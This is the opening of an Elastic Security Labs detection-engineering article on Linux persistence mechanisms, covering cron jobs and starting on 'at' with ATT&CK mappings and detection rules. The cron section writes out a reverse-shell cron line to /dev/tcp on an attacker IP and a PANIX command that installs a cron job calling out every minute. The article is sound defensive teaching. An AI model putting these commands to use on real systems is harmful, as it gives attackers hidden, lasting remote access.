<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width"/><title>Linux Detection Engineering - A primer on persistence mechanisms — Elastic Security Labs</title><meta name="description" content="In this second part of the Linux Detection Engineering series, we map multiple Linux persistence mechanisms to the MITRE ATT&amp;CK framework, explain how they work, and how to detect them."/><meta property="og:title" content="Linux Detection Engineering - A primer on persistence mechanisms — Elastic Security Labs"/><meta property="og:description" content="In this second part of the Linux Detection Engineering series, we map multiple Linux persistence mechanisms to the MITRE ATT&amp;CK framework, explain how they work, and how to detect them."/><meta property="og:image" content="https://www.elastic.co/security-labs/assets/images/primer-on-persistence-mechanisms/primer-on-persistence-mechanisms.jpg?feb8b7c0af3b27f89282891bec102514"/><meta property="og:image:alt" content="In this second part of the Linux Detection Engineering series, we map multiple Linux persistence mechanisms to the MITRE ATT&amp;CK framework, explain how they work, and how to detect them."/><meta property="og:site_name"/><meta property="og:url" content="https://www.elastic.co/security-labs/primer-on-persistence-mechanisms"/><meta property="og:type" content="website"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:title" content="Linux Detection Engineering - A primer on persistence mechanisms — Elastic Security Labs"/><meta name="twitter:description" content="In this second part of the Linux Detection Engineering series, we map multiple Linux persistence mechanisms to the MITRE ATT&amp;CK framework, explain how they work, and how to detect them."/><meta name="twitter:image" content="https://www.elastic.co/security-labs/assets/images/primer-on-persistence-mechanisms/primer-on-persistence-mechanisms.jpg?feb8b7c0af3b27f89282891bec102514"/><meta name="twitter:image:alt" content="In this second part of the Linux Detection Engineering series, we map multiple Linux persistence mechanisms to the MITRE ATT&amp;CK framework, explain how they work, and how to detect them."/><link rel="canonical" href="https://www.elastic.co/security-labs/primer-on-persistence-mechanisms"/><link rel="preload" href="/security-labs/logo.svg" as="image" fetchpriority="high"/><link rel="preload" as="image" imageSrcSet="/security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fprimer-on-persistence-mechanisms%2Fprimer-on-persistence-mechanisms.jpg&amp;w=640&amp;q=75 640w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fprimer-on-persistence-mechanisms%2Fprimer-on-persistence-mechanisms.jpg&amp;w=750&amp;q=75 750w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fprimer-on-persistence-mechanisms%2Fprimer-on-persistence-mechanisms.jpg&amp;w=828&amp;q=75 828w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fprimer-on-persistence-mechanisms%2Fprimer-on-persistence-mechanisms.jpg&amp;w=1080&amp;q=75 1080w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fprimer-on-persistence-mechanisms%2Fprimer-on-persistence-mechanisms.jpg&amp;w=1200&amp;q=75 1200w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fprimer-on-persistence-mechanisms%2Fprimer-on-persistence-mechanisms.jpg&amp;w=1920&amp;q=75 1920w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fprimer-on-persistence-mechanisms%2Fprimer-on-persistence-mechanisms.jpg&amp;w=2048&amp;q=75 2048w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fprimer-on-persistence-mechanisms%2Fprimer-on-persistence-mechanisms.jpg&amp;w=3840&amp;q=75 3840w" imageSizes="100vw" fetchpriority="high"/><meta name="next-head-count" content="19"/><script src="https://play.vidyard.com/embed/v4.js" type="text/javascript" async=""></script><link rel="icon" href="/security-labs/favicon.svg"/><link rel="mask-icon" href="/security-labs/favicon.svg" color="#1C1E23"/><link rel="apple-touch-icon" href="/security-labs/favicon.svg"/><meta name="theme-color" content="#1C1E23"/><link rel="preload" href="/security-labs/_next/static/media/6d93bde91c0c2823-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/a34f9d1faa5f3315-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/369c6e283c5acc6e-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/92f44bb82993d879-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/ee71530a747ff30b-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/9fac010bc1f02be0-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/cbf5fbad4d73afac-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><script id="google-tag-manager" data-nscript="beforeInteractive">
          (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
          new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
          j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
          'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
          })(window,document,'script','dataLayer','GTM-KNJMG2M');
          </script><link rel="preload" href="/security-labs/_next/static/css/265ed7605fd03477.css" as="style"/><link rel="stylesheet" href="/security-labs/_next/static/css/265ed7605fd03477.css" data-n-g=""/><link rel="preload" href="/security-labs/_next/static/css/1007ff9e696f6f88.css" as="style"/><link rel="stylesheet" href="/security-labs/_next/static/css/1007ff9e696f6f88.css" data-n-p=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/security-labs/_next/static/chunks/polyfills-78c92fac7aa8fdd8.js"></script><script src="/security-labs/_next/static/chunks/webpack-7987c6fda769d510.js" defer=""></script><script src="/security-labs/_next/static/chunks/framework-7a7e500878b44665.js" defer=""></script><script src="/security-labs/_next/static/chunks/main-ebd33a9f1cae5951.js" defer=""></script><script src="/security-labs/_next/static/chunks/pages/_app-cb8664d1d3df2511.js" defer=""></script><script src="/security-labs/_next/static/chunks/fec483df-43ee602fabdfe3a4.js" defer=""></script><script src="/security-labs/_next/static/chunks/877-34f408271ef44c22.js" defer=""></script><script src="/security-labs/_next/static/chunks/511-d08fe0fdd6f8a984.js" defer=""></script><script src="/security-labs/_next/static/chunks/683-a5053c37fe5bd0c9.js" defer=""></script><script src="/security-labs/_next/static/chunks/402-791da5e634930df4.js" defer=""></script><script src="/security-labs/_next/static/chunks/616-0b017b9cfa597392.js" defer=""></script><script src="/security-labs/_next/static/chunks/pages/%5Bslug%5D-3d74e9a05863bcfd.js" defer=""></script><script src="/security-labs/_next/static/dGrrQfBbQkqaleQ_11aBK/_buildManifest.js" defer=""></script><script src="/security-labs/_next/static/dGrrQfBbQkqaleQ_11aBK/_ssgManifest.js" defer=""></script></head><body><noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-KNJMG2M" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript><div id="__next"><main class="__variable_0351a5 __variable_1f211e __variable_a5b5f5 flex flex-col min-h-screen"><div class="scroll-percentage-container"><div class="scroll-percentage-bar" style="width:0%"></div></div><nav class="fixed w-full z-40" data-headlessui-state=""><div class="bg-gradient-to-b from-zinc-900 from-20% h-[200%] to-transparent absolute inset-0 z-0 pointer-events-none"></div><div class="container relative z-10"><div class="flex h-16 items-center justify-between"><div class="flex items-center justify-start w-full"><div><a class="hover:opacity-50 transition" href="/security-labs"><img alt="elastic security labs logo" fetchpriority="high" width="200" height="30" decoding="async" data-nimg="1" style="color:transparent" src="/security-labs/logo.svg"/></a></div><div class="hidden lg:ml-6 lg:block"><div class="flex space-x-4"><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="/security-labs/about"><span>About</span></a><div class="relative" data-headlessui-state=""><div><button class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" id="headlessui-menu-button-:R2kpm:" type="button" aria-haspopup="menu" aria-expanded="false" data-headlessui-state="">Topics<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true" class="ml-1 -mr-1 h-4 w-4 text-zinc-400 relative top-[1px]"><path fill-rule="evenodd" d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z" clip-rule="evenodd"></path></svg></button></div></div><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="/security-labs/category/vulnerability-updates"><span>Vulnerability updates</span></a><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="/security-labs/category/reports"><span>Reports</span></a><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="/security-labs/category/tools"><span>Tools</span></a></div></div><div class="hidden lg:ml-auto lg:block"><div class="flex items-center space-x-4"><a class="rounded flex items-center p-4 text-white focus:outline-none focus:ring-0 focus:ring-offset-1 focus:ring-offset-zinc-600 group" href="https://search.elastic.co/?location%5B0%5D=Security%20Labs&amp;referrer=https://www.elastic.co/security-labs/primer-on-persistence-mechanisms"><div class="flex items-center relative font-display"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="h-6 w-6"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-5.197-5.197m0 0A7.5 7.5 0 105.196 5.196a7.5 7.5 0 0010.607 10.607z"></path></svg></div></a><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="https://www.elastic.co/security-labs/rss/feed.xml"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true" class="h-4 w-4 mr-1"><path d="M3.75 3a.75.75 0 00-.75.75v.5c0 .414.336.75.75.75H4c6.075 0 11 4.925 11 11v.25c0 .414.336.75.75.75h.5a.75.75 0 00.75-.75V16C17 8.82 11.18 3 4 3h-.25z"></path><path d="M3 8.75A.75.75 0 013.75 8H4a8 8 0 018 8v.25a.75.75 0 01-.75.75h-.5a.75.75 0 01-.75-.75V16a6 6 0 00-6-6h-.25A.75.75 0 013 9.25v-.5zM7 15a2 2 0 11-4 0 2 2 0 014 0z"></path></svg><span class="hidden xl:block">Subscribe</span></a><a class="font-display inline-flex items-center justify-center rounded font-semibold disabled:!select-none disabled:!bg-gray-400 bg-blue-600 text-white hover:bg-blue-500 enabled:hover:text-white/80 transition-colors px-4 py-2 text-sm flex-1 lg:flex-auto" href="https://cloud.elastic.co/registration?cta=cloud-registration&amp;tech=trial&amp;plcmt=navigation&amp;pg=security-labs">Start free trial</a><a class="font-display inline-flex items-center justify-center rounded font-semibold text-white disabled:!select-none disabled:!bg-gray-400 button px-4 py-2 text-sm flex-1 lg:flex-auto" href="https://www.elastic.co/contact">Contact sales</a></div></div></div><div class="-mr-2 flex lg:hidden"><a class="rounded flex items-center p-4 text-white focus:outline-none focus:ring-0 focus:ring-offset-1 focus:ring-offset-zinc-600 group" href="https://search.elastic.co/?location%5B0%5D=Security%20Labs&amp;referrer=https://www.elastic.co/security-labs/primer-on-persistence-mechanisms"><div class="flex items-center relative font-display"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="h-6 w-6"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-5.197-5.197m0 0A7.5 7.5 0 105.196 5.196a7.5 7.5 0 0010.607 10.607z"></path></svg></div></a><button class="inline-flex items-center justify-center rounded-md p-2 text-gray-400 hover:bg-gray-700 hover:text-white focus:outline-none focus:ring-2 focus:ring-inset focus:ring-white" id="headlessui-disclosure-button-:R59m:" type="button" aria-expanded="false" data-headlessui-state=""><span class="sr-only">Open navigation menu</span><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="block h-6 w-6"><path stroke-linecap="round" stroke-linejoin="round" d="M3.75 6.75h16.5M3.75 12h16.5m-16.5 5.25h16.5"></path></svg></button></div></div></div></nav><main class="mb-20 flex-1 flex flex-col"><div class="h-48 md:h-64"><div class="after:absolute after:block after:bg-blue-400 after:blur-3xl after:content-[&#x27; &#x27;] after:h-96 after:opacity-5 after:right-0 after:rounded-full after:top-20 after:w-1/2 after:z-0 before:absolute before:block before:blur-3xl before:bg-orange-400 before:content-[&#x27; &#x27;] before:h-96 before:left-0 before:opacity-5 before:rounded-full before:w-1/2 before:z-0 w-full h-full relative"><div class="relative z-10 w-full h-[125%] -top-[25%] bg-no-repeat bg-cover bg-bottom flex items-center justify-center" style="background-image:url(/security-labs/grid.svg)"></div></div></div><article class="px-4"><div class="max-w-7xl mx-auto relative z-10 flex flex-col space-y-4"><div class="eyebrow break-words"><time class="block mb-2 md:mb-0 md:inline-block article-published-date" dateTime="2024-08-21T00:00:00.000Z">21 August 2024</time><span class="hidden md:inline-block md:mx-2">•</span><a class="hover:text-blue-400 text-xs md:text-sm whitespace-nowrap author-name" href="/security-labs/author/ruben-groenewoud">Ruben Groenewoud</a></div><h1 class="font-bold leading-tighter text-3xl md:text-5xl"><span>Linux Detection Engineering -&nbsp; A primer on persistence&nbsp;mechanisms</span></h1><p class="text-zinc-200 text-base md:text-xl">A walkthrough on how threat actors establish persistence on Linux systems and how to hunt for these techniques.</p><div class="flex items-center mt-4 text-zinc-200 text-sm space-x-4 border-t border-white/25 pt-4"><span class="flex items-center space-x-1"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="h-4 w-4 text-zinc-400"><path stroke-linecap="round" stroke-linejoin="round" d="M12 6v6h4.5m4.5 0a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg><span>50 min read</span></span><span class="flex items-center space-x-1"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="h-4 w-4 text-zinc-400"><path stroke-linecap="round" stroke-linejoin="round" d="M9.568 3H5.25A2.25 2.25 0 003 5.25v4.318c0 .597.237 1.17.659 1.591l9.581 9.581c.699.699 1.78.872 2.607.33a18.095 18.095 0 005.223-5.223c.542-.827.369-1.908-.33-2.607L11.16 3.66A2.25 2.25 0 009.568 3z"></path><path stroke-linecap="round" stroke-linejoin="round" d="M6 6h.008v.008H6V6z"></path></svg><span><a class="hover:text-blue-400 whitespace-nowrap" href="/security-labs/category/detection-science">Detection science</a></span></span></div></div><div class="max-w-7xl mx-auto"><div class="bg-zinc-900 border border-zinc-800 drop-shadow-lg p-5 sm:p-8 md:p-10 rounded-3xl mt-5 md:mt-10"><div class="relative w-full rounded-lg overflow-hidden aspect-video"><img alt="Linux Detection Engineering - A primer on persistence mechanisms" fetchpriority="high" decoding="async" data-nimg="fill" class="object-cover absolute h-full w-full" style="position:absolute;height:100%;width:100%;left:0;top:0;right:0;bottom:0;color:transparent" sizes="100vw" srcSet="/security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fprimer-on-persistence-mechanisms%2Fprimer-on-persistence-mechanisms.jpg&amp;w=640&amp;q=75 640w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fprimer-on-persistence-mechanisms%2Fprimer-on-persistence-mechanisms.jpg&amp;w=750&amp;q=75 750w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fprimer-on-persistence-mechanisms%2Fprimer-on-persistence-mechanisms.jpg&amp;w=828&amp;q=75 828w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fprimer-on-persistence-mechanisms%2Fprimer-on-persistence-mechanisms.jpg&amp;w=1080&amp;q=75 1080w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fprimer-on-persistence-mechanisms%2Fprimer-on-persistence-mechanisms.jpg&amp;w=1200&amp;q=75 1200w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fprimer-on-persistence-mechanisms%2Fprimer-on-persistence-mechanisms.jpg&amp;w=1920&amp;q=75 1920w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fprimer-on-persistence-mechanisms%2Fprimer-on-persistence-mechanisms.jpg&amp;w=2048&amp;q=75 2048w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fprimer-on-persistence-mechanisms%2Fprimer-on-persistence-mechanisms.jpg&amp;w=3840&amp;q=75 3840w" src="/security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fprimer-on-persistence-mechanisms%2Fprimer-on-persistence-mechanisms.jpg&amp;w=3840&amp;q=75"/><div class="absolute border border-white/50 inset-0 mix-blend-overlay rounded-lg z-10"></div></div></div></div><div class="lg:max-w-7xl mx-auto relative mt-12 lg:grid lg:grid-cols-4 lg:gap-8 items-start"><div class="flex justify-center lg:col-span-3"><div class="prose lg:prose-lg prose-invert w-full article-content"><div><h2 class="font-bold text-2xl md:text-4xl relative"><span id="introduction" class="absolute -top-32"></span>Introduction</h2>
<p>In this second part of the Linux Detection Engineering series, we&#x27;ll examine Linux persistence mechanisms in detail, starting with common or straightforward methods and moving toward more complex or obscure techniques. The goal is to educate defenders and security researchers on the foundational aspects of Linux persistence techniques by examining both trivial and more complicated methods, understanding how these methods work, how to hunt for them, and how to develop effective detection strategies.</p>
<p>For those who missed the first part, &quot;Linux Detection Engineering with Auditd&quot;, it can be found <a href="https://www.elastic.co/security-labs/linux-detection-engineering-with-auditd">here</a>.</p>
<p>For this installment, we&#x27;ll set up the persistence mechanisms, analyze the logs, and observe the potential detection opportunities. To aid in this process, we’re sharing <a href="https://github.com/Aegrah/PANIX">PANIX</a>, a Linux persistence tool developed by Ruben Groenewoud of Elastic Security. PANIX simplifies and customizes persistence setup to test your detections.</p>
<p>By the end of this article, you&#x27;ll have a solid understanding of each persistence mechanism we describe, including:</p>
<ul>
<li>How it works (theory)</li>
<li>How to set it up (practice)</li>
<li>How to detect it (SIEM and Endpoint rules)</li>
<li>How to hunt for it (ES|QL and OSQuery hunts)</li>
</ul>
<p>Step into the world of Linux persistence with us, it’s fun!</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="what-is-persistence" class="absolute -top-32"></span>What is persistence?</h2>
<p>Let’s start with the basics. <a href="https://attack.mitre.org/tactics/TA0003/">Persistence</a> refers to an attacker&#x27;s ability to maintain a foothold in a compromised system or network even after reboots, password changes, or other attempts to remove them.</p>
<p>Persistence is crucial for attackers, ensuring extended access to the target environment. This enables them to gather intelligence, understand the environment, move laterally through the network, and work towards achieving their objectives.</p>
<p>Given that most malware attempts to establish some form of persistence automatically, this phase is critical for defenders to understand. Ideally, attacks should be detected and prevented during initial access, but this is not always possible. Many malware samples also leverage multiple persistence techniques to ensure continued access. Notably, these persistence mechanisms can often be detected with robust defenses in place.</p>
<p>Even if an attack is detected, the initial access vector is patched and mitigated, but any leftover persistence mechanism can allow the attackers to regain access and resume their operations. Therefore, it&#x27;s essential to monitor the establishment of some persistence mechanisms close to real time and hunt others regularly.</p>
<p>To support this effort, Elastic utilizes the MITRE ATT&amp;CK framework as the primary lexicon for categorizing techniques in most of our detection artifacts. <a href="https://attack.mitre.org/matrices/enterprise/">MITRE ATT&amp;CK</a> is a globally accessible knowledge base of adversary tactics and techniques based on real-world observations. It is commonly used as a foundation for developing specific threat models and methodologies within the field of cybersecurity. By leveraging this comprehensive framework, we enhance our ability to detect, understand, and mitigate persistent threats effectively.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="setup" class="absolute -top-32"></span>Setup</h2>
<p>To ensure you are prepared to detect the persistence mechanisms discussed in this article, <a href="https://www.elastic.co/guide/en/security/current/prebuilt-rules-management.html#update-prebuilt-rules">enabling and updating our pre-built detection rules is important</a>. If you are working with a custom-built ruleset and do not use all of our pre-built rules, this is a great opportunity to test them and fill in any gaps.</p>
<p>To install, enable, and update our pre-built rules, follow these steps:</p>
<ol>
<li>Navigate to Kibana → Security → Rules → Detection rules (SIEM).</li>
<li>You will find your installed and potential new and/or updated pre-built rules here.</li>
<li>Use the &quot;Add Elastic rules&quot; button to add the latest Elastic pre-built rules.</li>
<li>Use the &quot;Rule Updates&quot; tab to update existing rules.</li>
</ol>
<p>Now, we are ready to get started.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="t1053---scheduled-taskjob" class="absolute -top-32"></span>T1053 - scheduled task/job</h2>
<p>Automating routine tasks is common in Unix-like operating systems for system maintenance. Some common utilities used for task scheduling are <a href="https://www.man7.org/linux/man-pages/man8/cron.8.html">cron</a> and <a href="https://man7.org/linux/man-pages/man1/at.1p.html">at</a>. MITRE details information related to this technique under the identifier <a href="https://attack.mitre.org/techniques/T1053/">T1053</a>.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="t1053003---scheduled-taskjob-cron" class="absolute -top-32"></span>T1053.003 - scheduled task/job: Cron</h3>
<p><a href="https://www.man7.org/linux/man-pages/man8/cron.8.html">Cron</a> is a utility for scheduling recurring tasks to run at specific times or intervals. It is available by default on most Linux distributions. It is a <a href="https://man7.org/linux/man-pages/man7/daemon.7.html">daemon</a> (that is, a background process that typically performs tasks without requiring user interaction) that reads cron files from a default set of locations. These files contain commands to run periodically and/or at a scheduled time.</p>
<p>The scheduled task is called a cron job and can be executed with both user and root permissions, depending on the configuration. Due to its versatility, cron is an easy and stable candidate for Linux persistence, even without escalating to root privileges upon initial access.</p>
<p>There are user-specific and system-wide cron jobs. The user-specific cron jobs commonly reside in:</p>
<ul>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/var/spool/cron/</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/var/spool/cron/crontabs/</code></li>
</ul>
<p>The system-wide cron jobs are located in the following:</p>
<ul>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/crontab</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/cron.d/</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/cron.daily/</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/cron.hourly/</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/cron.monthly/</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/cron.weekly/</code></li>
</ul>
<p>The cron file syntax slightly differs based on the location in which the cron file is created. For the cron files in the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/</code> directory, the user who will execute the job must be specified.</p>
<pre><code>* * * * * root /bin/bash -c &#x27;/srv/backup_tool.sh&#x27;</code></pre>
<p>Conversely, the user who created the cron files in the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/var/spool/cron/crontabs/</code> directory will execute the cron files.</p>
<pre><code>* * * * * /bin/bash -c &#x27;/srv/backup_tool.sh&#x27;</code></pre>
<p>The asterisks are used to create the schedule. They represent (in order) minutes, hours, days (of the month), months, and days (of the week). Setting “<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">* * * * *</code>” means the cron job is executed every minute while setting “<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">* * 1 12 *</code>”<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600"> </code>means the cron job is executed every minute on the first day of December. Information on cron scheduling is available at <a href="https://crontab.guru/">Crontab Guru</a>.</p>
<p>Attackers can exploit these jobs to run scripts or binaries that establish reverse connections or add reverse shell commands.</p>
<pre><code>* * * * * root /bin/bash -c &#x27;sh -i &gt;&amp; /dev/tcp/192.168.1.1/1337 0&gt;&amp;1&#x27;</code></pre>
<p>MITRE specifies more information and real-world examples related to this technique in <a href="https://attack.mitre.org/techniques/T1053/003/">T1053.003</a>.</p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="persistence-through-t1053003---cron" class="absolute -top-32"></span>Persistence through T1053.003 - cron</h4>
<p>You can manually create a system-wide cron file in any of the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/</code> directories or use the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">crontab -e</code> command to create a user-specific cron file. To more easily illustrate all of the persistence mechanisms presented in these articles, we will use PANIX. Depending on the privileges when running it, you can establish persistence like so:</p>
<pre><code>sudo ./panix.sh --cron --default --ip 192.168.1.1 --port 2001
[+] Cron job persistence established.</code></pre>
<p>The default setting for the root user will create a cron file at <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/cron.d/freedesktop_timesync1</code> that calls out to the attacker system every minute. When looking at the events, we can see the following:</p>
<p></p>
<p>When PANIX was executed, the cron job was created, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/sbin/cron</code> read the contents of the cron file and executed it, after which a network connection was established. Analyzing this chain of events, we can identify several detection capabilities for this and other proof-of-concepts.</p>
<p>Elastic SIEM includes over 1,000 prebuilt rules and more than 200 specifically dedicated to Linux. These rules run on the Elastic cluster and are designed to detect threat techniques that are available in our public <a href="https://github.com/elastic/detection-rules/tree/main">detection rules repository</a>. Our prevention capabilities include behavioral endpoint rules and memory/file signatures, which are utilized by Elastic Defend and can be found in our public <a href="https://github.com/elastic/protections-artifacts">protection artifacts repository</a>.</p>
<div class="table-container"><table style="width:100%;table-layout:fixed;word-wrap:break-word"><thead><tr><th>Category</th><th>Coverage</th></tr></thead><tbody><tr><td>File</td><td><a href="https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_cron_job_creation.toml">Cron Job Created or Modified</a></td></tr><tr><td></td><td><a href="https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_etc_file_creation.toml">Suspicious File Creation in /etc for Persistence</a></td></tr><tr><td></td><td><a href="https://github.com/elastic/detection-rules/blob/main/rules/integrations/fim/persistence_suspicious_file_modifications.toml">Potential Persistence via File Modification</a></td></tr><tr><td>Process</td><td><a href="https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_hidden_payload_executed_via_scheduled_job.toml">Hidden Payload Executed via Scheduled Job</a></td></tr><tr><td></td><td><a href="https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_scheduled_job_executing_binary_in_unusual_location.toml">Scheduled Job Executing Binary in Unusual Location</a></td></tr><tr><td></td><td><a href="https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_scheduled_task_unusual_command_execution.toml">Scheduled Task Unusual Command Execution</a></td></tr></tbody></table></div>
<p>The file category has three different rules, the first two focusing on creation/modification using Elastic Defend, while the third focuses on modification through <a href="https://www.elastic.co/docs/current/integrations/fim">File Integrity Monitoring (FIM)</a>. FIM can be set up using <a href="https://www.elastic.co/guide/en/beats/auditbeat/current/auditbeat-module-file_integrity.html">Auditbeat</a> or via the Fleet integration. To correctly set up FIM, it is important to specify full paths to the files that FIM should monitor, as it does <em>not</em> allow for wildcards. Therefore, Potential Persistence via File Modification is a rule that requires manual setup and tailoring to your specific needs, as it will require individual entries depending on the persistence technique you are trying to detect.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="t1053002---scheduled-taskjob-at" class="absolute -top-32"></span>T1053.002 - scheduled task/job: at</h3>
<p><a href="https://man7.org/linux/man-pages/man1/at.1p.html">At</a> is a utility for scheduling one-time tasks to run at a specified time in the future on Linux systems. Unlike cron, which handles recurring tasks, At is designed for single executions. The At daemon (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">atd</code>) manages and executes these scheduled tasks at the specified time.</p>
